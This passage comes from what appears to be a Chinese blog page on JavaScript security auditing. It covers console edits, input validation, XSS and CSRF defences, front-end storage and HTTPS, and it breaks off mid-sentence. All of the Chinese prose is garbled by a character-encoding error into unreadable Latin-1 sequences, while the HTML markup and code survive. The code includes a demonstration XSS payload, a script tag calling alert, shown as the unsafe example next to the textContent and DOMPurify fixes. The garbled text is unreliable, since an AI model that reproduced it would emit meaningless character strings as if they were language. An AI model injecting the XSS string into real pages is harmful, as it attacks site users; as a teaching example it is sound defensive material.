é€»è¾‘"></a>å…­ã€ä¸´æ—¶ä¿®æ”¹ç½‘é¡µä¸­çš„ JavaScript é€»è¾‘</h3><p>å¦‚æœä½ æƒ³è¦ä¸´æ—¶ä¿®æ”¹ç½‘é¡µä¸­çš„ JavaScript é€»è¾‘ï¼Œå¯ä»¥é€šè¿‡åœ¨æ§åˆ¶å°ä¸­æ·»åŠ æ–°çš„ä»£ç å—æ¥å®ç°ã€‚</p><h4 id="6-1-æ³¨å…¥æ–°çš„é€»è¾‘"><a href="#6-1-æ³¨å…¥æ–°çš„é€»è¾‘" class="headerlink" title="6.1 æ³¨å…¥æ–°çš„é€»è¾‘"></a>6.1 æ³¨å…¥æ–°çš„é€»è¾‘</h4><p>ä½ å¯ä»¥åŠ¨æ€æ³¨å…¥ä¸€æ®µæ–°çš„ JavaScript ä»£ç æ¥æ”¹å˜ç½‘é¡µçš„è¡Œä¸ºï¼Œæµ‹è¯•ç‰¹å®šåŠŸèƒ½æˆ–è¡Œä¸ºã€‚</p><p><strong>ç¤ºä¾‹ï¼š</strong></p><p>å‡è®¾é¡µé¢æœ‰ä¸€ä¸ªæäº¤æŒ‰é’®ï¼Œä½ æƒ³åœ¨æäº¤ä¹‹å‰å¢åŠ é¢å¤–çš„æ£€æŸ¥ï¼Œå¯ä»¥è¿™æ ·åšï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">let</span> submitButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#submitButton&#x27;</span>);<br>submitButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#checkbox&#x27;</span>).<span class="hljs-property">checked</span>) &#123;<br>    event.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// é˜»æ­¢æäº¤</span><br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;You must agree to the terms!&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åœ¨æ§åˆ¶å°ä¸­ï¼Œä½ å¯ä»¥åŠ¨æ€ä¿®æ”¹ JavaScript ä»£ç ã€DOM å…ƒç´ ã€äº‹ä»¶å¤„ç†ç¨‹åºä»¥åŠå¯¹è±¡å±æ€§ã€‚è¿™ç§ä¿®æ”¹åªåœ¨å½“å‰é¡µé¢åŠ è½½å‘¨æœŸå†…æœ‰æ•ˆï¼Œåˆ·æ–°é¡µé¢åä¼šæ¢å¤ä¸ºåŸå§‹çŠ¶æ€ã€‚æ§åˆ¶å°æä¾›äº†æå¤§çš„çµæ´»æ€§ï¼Œå¯ä»¥å¸®åŠ©ä½ è°ƒè¯•ã€æµ‹è¯•å’Œä¸´æ—¶ä¿®æ”¹ç½‘é¡µè¡Œä¸ºï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨äºå¼€å‘è¿‡ç¨‹ä¸­å¿«é€ŸéªŒè¯æƒ³æ³•ã€‚</p><p>JavaScript çš„å®‰å…¨æ€§å®¡è®¡æ˜¯ç¡®ä¿åº”ç”¨ç¨‹åºä¸ä¼šå› ä¸º JavaScript çš„æ¼æ´æˆ–ä¸å½“ä½¿ç”¨è€Œé­å—æ”»å‡»çš„å…³é”®ç¯èŠ‚ã€‚Web åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºå‰ç«¯ JavaScript ä»£ç çš„å®‰å…¨æ€§ï¼Œå› ä¸ºå®ƒç›´æ¥ä¸ç”¨æˆ·äº¤äº’ï¼ŒåŒæ—¶å¤„ç†è¾“å…¥ã€å‘èµ·è¯·æ±‚ï¼Œå¹¶æ§åˆ¶é¡µé¢é€»è¾‘ã€‚é€šè¿‡å®‰å…¨æ€§å®¡è®¡ï¼Œå¯ä»¥å‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´ï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰ã€ç‚¹å‡»åŠ«æŒã€ä»£ç æ³¨å…¥ç­‰ã€‚</p><p>åœ¨ JavaScript å®‰å…¨æ€§å®¡è®¡ä¸­ï¼Œä¸»è¦ä»<strong>è¾“å…¥éªŒè¯ã€å®‰å…¨ç¼–ç å®è·µã€åº“å’Œä¾èµ–çš„å®¡è®¡ã€å‰ç«¯å­˜å‚¨å’Œç½‘ç»œè¯·æ±‚å®‰å…¨æ€§</strong>ç­‰æ–¹é¢è¿›è¡Œã€‚ä»¥ä¸‹å°†è¯¦ç»†è®²è¿°å¦‚ä½•å¯¹ JavaScript ä»£ç è¿›è¡Œå…¨é¢çš„å®‰å…¨æ€§å®¡è®¡ã€‚</p><hr><h3 id="ä¸€ã€è¾“å…¥éªŒè¯"><a href="#ä¸€ã€è¾“å…¥éªŒè¯" class="headerlink" title="ä¸€ã€è¾“å…¥éªŒè¯"></a>ä¸€ã€è¾“å…¥éªŒè¯</h3><p>JavaScript çš„è¾“å…¥éªŒè¯æ˜¯å®¡è®¡çš„é¦–è¦ç¯èŠ‚ï¼Œå› ä¸ºä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥æ˜¯æ”»å‡»çš„æœ€å¸¸è§æ¥æºã€‚å‰ç«¯çš„è¾“å…¥éªŒè¯åº”è¢«è§†ä¸º<strong>ç¬¬ä¸€é“é˜²çº¿</strong>ï¼Œä½†ä¸èƒ½ä¾èµ–å…¶å®Œå…¨é˜»æ­¢æ”»å‡»ï¼Œåç«¯å¿…é¡»åŒæ ·ä¸¥æ ¼éªŒè¯è¾“å…¥ã€‚å‰ç«¯çš„è¾“å…¥éªŒè¯ä¸»è¦ç”¨äºæå‡ç”¨æˆ·ä½“éªŒã€å‡å°‘ä¸å¿…è¦çš„è¯·æ±‚ã€‚</p><h4 id="1-1-å‰ç«¯è¾“å…¥éªŒè¯æ£€æŸ¥"><a href="#1-1-å‰ç«¯è¾“å…¥éªŒè¯æ£€æŸ¥" class="headerlink" title="1.1 å‰ç«¯è¾“å…¥éªŒè¯æ£€æŸ¥"></a>1.1 å‰ç«¯è¾“å…¥éªŒè¯æ£€æŸ¥</h4><ol><li><p><strong>ç¼ºå¤±æˆ–ä¸å½“çš„éªŒè¯é€»è¾‘ï¼š</strong></p><ul><li>ç¡®ä¿æ‰€æœ‰è¾“å…¥æ•°æ®ï¼ŒåŒ…æ‹¬è¡¨å•ã€URL å‚æ•°ã€AJAX è¯·æ±‚ã€ç”¨æˆ·äº¤äº’çš„æ–‡ä»¶æˆ–å›¾ç‰‡ç­‰ï¼Œéƒ½è¿›è¡Œäº†åˆæ­¥çš„éªŒè¯ã€‚</li><li>æ£€æŸ¥æ˜¯å¦æœ‰è¾“å…¥é•¿åº¦é™åˆ¶ã€å­—ç¬¦ç±»å‹é™åˆ¶ï¼ˆå¦‚ä»…æ¥å—æ•°å­—æˆ–å­—æ¯ï¼‰ã€å¿…å¡«é¡¹ç­‰ã€‚</li></ul></li><li><p><strong>é˜²æ­¢è„šæœ¬æ³¨å…¥ï¼š</strong></p><ul><li>é˜²æ­¢ç”¨æˆ·é€šè¿‡è¾“å…¥æ¶æ„è„šæœ¬æ¥è¿›è¡Œä»£ç æ³¨å…¥ï¼ˆå¦‚ XSS æ”»å‡»ï¼‰ã€‚ç‰¹åˆ«æ˜¯<code>&lt;script&gt;</code>æ ‡ç­¾æˆ–ç±»ä¼¼çš„ä»£ç åº”è¢«ä¸¥æ ¼è¿‡æ»¤ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ä¸å®‰å…¨çš„å¤„ç†æ–¹å¼ï¼šç›´æ¥åœ¨é¡µé¢ä¸­æ˜¾ç¤ºç”¨æˆ·è¾“å…¥çš„å†…å®¹</span><br><span class="hljs-keyword">let</span> userInput = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS Attack&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userInput;  <span class="hljs-comment">// XSS æ”»å‡»</span><br> <br><span class="hljs-comment">// å®‰å…¨çš„åšæ³•ï¼šä½¿ç”¨ textContent æ’å…¥çº¯æ–‡æœ¬ï¼Œé¿å… XSS</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userInput;<br></code></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¾“å…¥è¿‡æ»¤ï¼š</strong></p><ul><li>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è¾“å…¥è¿›è¡Œæœ‰æ•ˆæ€§æ£€æŸ¥ï¼Œä½†ç¡®ä¿æ­£åˆ™è¡¨è¾¾å¼è¶³å¤Ÿå®‰å…¨ï¼Œä¸ä¼šå¼•å‘æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆReDoSï¼‰ï¼Œå³æ¶æ„ç”¨æˆ·é€šè¿‡æ„é€ å¤æ‚è¾“å…¥è§¦å‘æ­£åˆ™è¡¨è¾¾å¼çš„æ€§èƒ½é—®é¢˜ï¼Œå¯¼è‡´æœåŠ¡å™¨å“åº”è¿‡æ…¢ç”šè‡³å´©æºƒã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateInput</span>(<span class="hljs-params">input</span>) &#123;<br>  <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-zA-Z0-9]+$/</span>;  <span class="hljs-comment">// ä»…å…è®¸å­—æ¯å’Œæ•°å­—</span><br>  <span class="hljs-keyword">return</span> regex.<span class="hljs-title function_">test</span>(input);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>é˜²æ­¢HTMLå®ä½“æ³¨å…¥ï¼š</strong></p><ul><li>ä¸å…è®¸ç”¨æˆ·åœ¨è¾“å…¥ä¸­æ’å…¥ HTML æ ‡ç­¾ã€å®ä½“ç­‰ã€‚å¯ä»¥ä½¿ç”¨åº“å¯¹è¾“å…¥è¿›è¡Œ HTML å®ä½“ç¼–ç æˆ–è¿‡æ»¤ï¼ˆä¾‹å¦‚<code>DOMPurify</code>ï¼‰ã€‚</li></ul></li></ol><hr><h3 id="äºŒã€è·¨ç«™è„šæœ¬æ”»å‡»-XSS-é˜²æŠ¤"><a href="#äºŒã€è·¨ç«™è„šæœ¬æ”»å‡»-XSS-é˜²æŠ¤" class="headerlink" title="äºŒã€è·¨ç«™è„šæœ¬æ”»å‡» (XSS) é˜²æŠ¤"></a>äºŒã€è·¨ç«™è„šæœ¬æ”»å‡» (XSS) é˜²æŠ¤</h3><p><strong>XSS</strong> æ”»å‡»æ˜¯ä¸€ç§æœ€å¸¸è§çš„ Web æ”»å‡»ç±»å‹ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥æ¶æ„ JavaScript è„šæœ¬ï¼Œåœ¨å…¶ä»–ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œã€‚æ”»å‡»è€…é€šå¸¸åˆ©ç”¨ä¸å®‰å…¨çš„è¾“å…¥å¤„ç†ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œä»¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€åŠ«æŒç”¨æˆ·è´¦æˆ·ç­‰ã€‚</p><h4 id="2-1-XSS-çš„ç±»å‹"><a href="#2-1-XSS-çš„ç±»å‹" class="headerlink" title="2.1 XSS çš„ç±»å‹"></a>2.1 XSS çš„ç±»å‹</h4><ol><li><p><strong>å­˜å‚¨å‹ XSS</strong>ï¼š</p><ul><li>æ¶æ„è„šæœ¬è¢«å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯æ•°æ®åº“ä¸­ï¼Œæ¯æ¬¡å½“ç”¨æˆ·è®¿é—®ç›¸å…³é¡µé¢æ—¶ï¼Œè„šæœ¬ä¼šè¢«æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…é€šè¿‡ç•™è¨€æ¿æ’å…¥æ¶æ„è„šæœ¬ï¼Œå½“å…¶ä»–ç”¨æˆ·æŸ¥çœ‹æ—¶ï¼Œè„šæœ¬æ‰§è¡Œã€‚</li></ul></li><li><p><strong>åå°„å‹ XSS</strong>ï¼š</p><ul><li>æ¶æ„è„šæœ¬è¢«å³æ—¶æ‰§è¡Œï¼Œé€šå¸¸åµŒå…¥åœ¨ URL ä¸­ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡æ¬ºéª—ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œè¯¥é“¾æ¥åŒ…å«äº†æ”»å‡»è€…çš„ JavaScript ä»£ç ï¼Œè¯¥ä»£ç ä¼šåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚</li></ul></li><li><p><strong>DOM å‹ XSS</strong>ï¼š</p><ul><li>æ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ JavaScript æ“ä½œæ¥ä¿®æ”¹é¡µé¢çš„ DOM æ ‘ï¼Œä½¿æ¶æ„ä»£ç è¢«æ³¨å…¥å¹¶æ‰§è¡Œã€‚è¿™ç§æ”»å‡»å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œæ— éœ€ä¸æœåŠ¡å™¨äº¤äº’ã€‚</li></ul></li></ol><h4 id="2-2-XSS-é˜²æŠ¤æªæ–½"><a href="#2-2-XSS-é˜²æŠ¤æªæ–½" class="headerlink" title="2.2 XSS é˜²æŠ¤æªæ–½"></a>2.2 XSS é˜²æŠ¤æªæ–½</h4><ol><li><p>**é¿å…ç›´æ¥ä½¿ç”¨ <code>innerHTML</code> æˆ– <code>document.write()</code>**ï¼š</p><ul><li>é¿å…ç›´æ¥å°†ä¸å¯ä¿¡çš„è¾“å…¥æ’å…¥ DOMã€‚åº”ä½¿ç”¨æ›´å®‰å…¨çš„ <code>textContent</code> æˆ– <code>innerText</code>ï¼Œå°†ç”¨æˆ·è¾“å…¥ä½œä¸ºçº¯æ–‡æœ¬æ’å…¥ï¼Œè€Œä¸æ˜¯ä½œä¸º HTMLã€‚</li></ul><p><strong>ä¸å®‰å…¨çš„ç¤ºä¾‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> userComment = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userComment;  <span class="hljs-comment">// å¯èƒ½å¯¼è‡´XSS</span><br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨çš„æ›¿ä»£æ–¹å¼ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userComment;  <span class="hljs-comment">// å®‰å…¨</span><br></code></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨å¯ä¿¡çš„åº“è¿›è¡Œè½¬ä¹‰</strong>ï¼š</p><ul><li>ä½¿ç”¨åº“å¦‚ <code>DOMPurify</code> å¯¹ç”¨æˆ·ç”Ÿæˆçš„å†…å®¹è¿›è¡Œæ¸…ç†å’Œè¿‡æ»¤ï¼Œç¡®ä¿åœ¨æ’å…¥ DOM æ—¶å·²ç»ç§»é™¤äº†å¯èƒ½çš„æ¶æ„ä»£ç ã€‚</li><li>å¯¹æ‰€æœ‰è¾“å…¥éƒ½è¿›è¡Œ HTML è½¬ä¹‰ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ <code>&lt;</code> å’Œ <code>&gt;</code>ï¼‰è¢«è§£é‡Šä¸º HTML ä»£ç ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> sanitizedInput = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(userInput);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = sanitizedInput;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰</strong>ï¼š</p><ul><li>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰æ˜¯ä¸€ç§æœ‰æ•ˆçš„ XSS é˜²æŠ¤æœºåˆ¶ï¼Œå®ƒå…è®¸æœåŠ¡å™¨æŒ‡å®šæµè§ˆå™¨åªåŠ è½½å’Œæ‰§è¡Œæ¥è‡ªå¯ä¿¡æºçš„ JavaScript ä»£ç ã€‚é€šè¿‡è®¾ç½®ä¸¥æ ¼çš„ CSP å¤´ï¼Œå¯ä»¥é˜²æ­¢é¡µé¢åŠ è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;;<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="ä¸‰ã€è·¨ç«™è¯·æ±‚ä¼ªé€ -CSRF-é˜²æŠ¤"><a href="#ä¸‰ã€è·¨ç«™è¯·æ±‚ä¼ªé€ -CSRF-é˜²æŠ¤" class="headerlink" title="ä¸‰ã€è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF) é˜²æŠ¤"></a>ä¸‰ã€è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF) é˜²æŠ¤</h3><p><strong>CSRF</strong> æ˜¯ä¸€ç§æ”»å‡»æ‰‹æ³•ï¼Œæ”»å‡»è€…é€šè¿‡ä¼ªé€ å—å®³è€…çš„èº«ä»½ï¼Œå‘é€æœªç»æˆæƒçš„è¯·æ±‚ã€‚æ”»å‡»çš„æœ¬è´¨æ˜¯åˆ©ç”¨äº†å—å®³è€…çš„è®¤è¯çŠ¶æ€ï¼ˆå¦‚ç™»å½•ä¼šè¯ã€Cookieï¼‰ï¼Œåœ¨æœªç»ç”¨æˆ·åŒæ„çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><h4 id="3-1-CSRF-æ”»å‡»çš„é˜²æŠ¤æªæ–½"><a href="#3-1-CSRF-æ”»å‡»çš„é˜²æŠ¤æªæ–½" class="headerlink" title="3.1 CSRF æ”»å‡»çš„é˜²æŠ¤æªæ–½"></a>3.1 CSRF æ”»å‡»çš„é˜²æŠ¤æªæ–½</h4><ol><li><p><strong>CSRF ä»¤ç‰Œ</strong>ï¼š</p><ul><li>æ¯æ¬¡ç”¨æˆ·å‘é€è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœºçš„ CSRF ä»¤ç‰Œï¼Œå¹¶å°†å…¶åŒ…å«åœ¨è¡¨å•æˆ– AJAX è¯·æ±‚ä¸­ã€‚æœåŠ¡å™¨éªŒè¯è¯¥ä»¤ç‰Œçš„åˆæ³•æ€§ï¼Œé˜²æ­¢æ”»å‡»è€…ä¼ªé€ è¯·æ±‚ã€‚</li><li>åœ¨ JavaScript ä¸­ï¼Œç¡®ä¿è¯·æ±‚æ—¶å°† CSRF ä»¤ç‰ŒåŒ…å«åœ¨è¯·æ±‚çš„å¤´éƒ¨æˆ–è¡¨å•ä¸­ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/api/submit&quot;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>    <span class="hljs-string">&quot;CSRF-Token&quot;</span>: csrfToken  <span class="hljs-comment">// åŒ…å«CSRFä»¤ç‰Œ</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&quot;user data&quot;</span> &#125;)<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>åŒé‡ Cookie é˜²æŠ¤</strong>ï¼š</p><ul><li>ä¸€ç§å¸¸è§çš„ç­–ç•¥æ˜¯ä½¿ç”¨åŒé‡ Cookieï¼šä¸€ä¸ªæ˜¯æ ‡å‡†çš„ä¼šè¯ Cookieï¼Œå¦ä¸€ä¸ªæ˜¯ HTTP å¤´ä¸­å‘é€çš„ CSRF ä»¤ç‰Œã€‚è¿™ç§æ–¹å¼å¯ä»¥ç¡®ä¿è¯·æ±‚å¿…é¡»æ¥è‡ªåˆæ³•çš„ç”¨æˆ·ç«¯ã€‚</li></ul></li></ol><hr><h3 id="å››ã€å‰ç«¯å­˜å‚¨çš„å®‰å…¨æ€§"><a href="#å››ã€å‰ç«¯å­˜å‚¨çš„å®‰å…¨æ€§" class="headerlink" title="å››ã€å‰ç«¯å­˜å‚¨çš„å®‰å…¨æ€§"></a>å››ã€å‰ç«¯å­˜å‚¨çš„å®‰å…¨æ€§</h3><p>Web åº”ç”¨ä¸­å‰ç«¯å­˜å‚¨çš„æ•°æ®ï¼ˆå¦‚ <code>LocalStorage</code> å’Œ <code>SessionStorage</code>ï¼‰ä¹Ÿå­˜åœ¨å®‰å…¨éšæ‚£ï¼Œå°¤å…¶æ˜¯å¤„ç†æ•æ„Ÿæ•°æ®æ—¶ï¼Œéœ€è¦ç‰¹åˆ«å°å¿ƒã€‚å› ä¸ºå‰ç«¯å­˜å‚¨çš„æ•°æ®æ˜¯å¯ä»¥è¢«æµè§ˆå™¨ä¸­çš„ä»»ä½•è„šæœ¬è¯»å–çš„ã€‚</p><h4 id="4-1-é¿å…å­˜å‚¨æ•æ„Ÿæ•°æ®"><a href="#4-1-é¿å…å­˜å‚¨æ•æ„Ÿæ•°æ®" class="headerlink" title="4.1 é¿å…å­˜å‚¨æ•æ„Ÿæ•°æ®"></a>4.1 é¿å…å­˜å‚¨æ•æ„Ÿæ•°æ®</h4><ol><li><p><strong>æ•æ„Ÿæ•°æ®ä¸åº”å­˜å‚¨åœ¨ LocalStorage æˆ– SessionStorage</strong>ï¼š</p><ul><li>ä¸è¦å°†æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç”¨æˆ·çš„ç™»å½•å‡­è¯ã€å¯†ç ã€ä»¤ç‰Œç­‰ï¼‰ç›´æ¥å­˜å‚¨åœ¨ <code>LocalStorage</code> æˆ– <code>SessionStorage</code> ä¸­ï¼Œå› ä¸ºå®ƒä»¬å¯¹ JavaScript ä»£ç å®Œå…¨å…¬å¼€ï¼Œä»»ä½•è„šæœ¬ï¼ˆåŒ…æ‹¬ XSSï¼‰éƒ½å¯ä»¥è®¿é—®è¿™äº›å­˜å‚¨æ•°æ®ã€‚</li><li>å¦‚æœéœ€è¦ä½¿ç”¨ä¼šè¯ä»¤ç‰Œï¼Œåº”è¯¥å­˜å‚¨åœ¨ Cookie ä¸­ï¼Œå¹¶ä½¿ç”¨ <code>HttpOnly</code> å’Œ <code>Secure</code> æ ‡å¿—ï¼Œç¡®ä¿ JavaScript æ— æ³•è®¿é—®ï¼Œä¸”åªåœ¨ HTTPS è¿æ¥ä¸­ä¼ è¾“ã€‚</li></ul></li><li><p><strong>åŠ å¯†å­˜å‚¨</strong>ï¼š</p><ul><li>å¯¹å­˜å‚¨çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå³ä½¿æ”»å‡»è€…èƒ½å¤Ÿè¯»å–å­˜å‚¨çš„å†…å®¹ï¼Œä¹Ÿæ— æ³•è½»æ˜“è§£å¯†è¿™äº›ä¿¡æ¯ã€‚</li><li>ä½†åº”æ³¨æ„ï¼Œå‰ç«¯çš„åŠ å¯†å¯†é’¥ä¹Ÿä¸èƒ½å­˜å‚¨åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ï¼Œå› ä¸ºè¿™æ ·ä¼šæš´éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ã€‚</li></ul></li></ol><hr><h3 id="äº”ã€ç½‘ç»œè¯·æ±‚çš„å®‰å…¨æ€§"><a href="#äº”ã€ç½‘ç»œè¯·æ±‚çš„å®‰å…¨æ€§" class="headerlink" title="äº”ã€ç½‘ç»œè¯·æ±‚çš„å®‰å…¨æ€§"></a>äº”ã€ç½‘ç»œè¯·æ±‚çš„å®‰å…¨æ€§</h3><p>JavaScript é€šå¸¸ç”¨äºå‘èµ·ç½‘ç»œè¯·æ±‚ï¼ˆå¦‚ AJAXã€Fetch API ç­‰ï¼‰ï¼Œå› æ­¤è¯·æ±‚çš„å®‰å…¨æ€§ä¹Ÿæ˜¯å®¡è®¡çš„é‡ç‚¹ã€‚ç¡®ä¿æ•°æ®ä¼ è¾“çš„å®‰å…¨ï¼Œé˜²æ­¢ç½‘ç»œå±‚é¢ä¸Šçš„æ”»å‡»ã€‚</p><h4 id="5-1-HTTPS-åŠ å¯†é€šä¿¡"><a href="#5-1-HTTPS-åŠ å¯†é€šä¿¡" class="headerlink" title="5.1 HTTPS åŠ å¯†é€šä¿¡"></a>5.1 HTTPS åŠ å¯†é€šä¿¡</h4><ol><li><p><strong>ç¡®ä¿æ‰€æœ‰è¯·æ±‚éƒ½é€šè¿‡ HTTPS è¿›è¡Œä¼ è¾“</strong>ï¼š</p><ul><li>é€šè¿‡ HTTPS å¯ä»¥ç¡®ä¿æ•°æ®åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¼ è¾“æ˜¯åŠ å¯†çš„ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ã€‚</li><li>åœ¨ JavaScript ä¸­ï¼Œç¡®ä¿è¯·æ±‚çš„ URL éƒ½æ˜¯ HTTPS åœ°å€ï¼Œè€Œä¸æ˜¯ HTTPã€‚</li></ul></li><li><p>**éªŒè¯æœåŠ¡å™¨</p></li></ol><p>çš„ SSL è¯ä¹¦**ï¼š</p><ul><li>å¦‚æœç½‘ç«™æ²¡æœ‰æ­£ç¡®é…ç½® SSL è¯ä¹¦ï¼Œæµè§ˆå™¨ä¼šæé†’ç”¨æˆ·è¿æ¥ä¸å®‰å…¨ï¼Œå¯¼è‡´ä¿¡ä»»é—®é¢˜ã€‚åº”ç¡®ä¿æœåŠ¡å™¨é…ç½®äº†æœ‰æ•ˆçš„ SSL è¯ä¹¦ï¼Œä¸”ä¸ä¼šè¿‡æœŸã€‚</li></ul><h4 id="5-2-é˜²æ­¢-API-æ»¥ç”¨å’Œ-CSRF"><a href="#5-2-é˜²æ­¢-API-æ»¥ç”¨å’Œ-CSRF" class="headerlink" title="5.2 é˜²æ­¢ API æ»¥ç”¨å’Œ CSRF"></a>5.2 é˜²æ­¢ API æ»¥ç”¨å’Œ CSRF</h4><ol><li><p><strong>ä½¿ç”¨é€‚å½“çš„èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶</strong>ï¼š</p><ul><li>é€šè¿‡ä»¤ç‰Œï¼ˆå¦‚ JWT æˆ– 